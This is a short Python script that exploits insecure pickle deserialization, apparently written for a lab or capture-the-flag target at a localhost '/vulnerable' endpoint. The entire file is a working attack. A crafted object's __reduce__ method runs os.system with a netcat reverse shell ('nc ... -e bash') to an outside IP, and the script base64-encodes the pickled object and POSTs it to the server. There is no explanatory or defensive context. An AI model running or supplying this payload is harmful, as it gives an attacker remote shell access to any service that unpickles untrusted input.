import pickle 
import base64
import requests 
url = "http://localhost:5000/vulnerable"

class VulnPickle(object):
    def __reduce__(self):
        import os
        return (os.system,("nc 172.31.134.255 4007 -e bash",))
    
encoded_data = base64.urlsafe_b64encode(pickle.dumps(VulnPickle())).decode()
post_data = {'hack': encoded_data}
response = requests.post(url, data=post_data)
print(response.status_code)
print(response.text)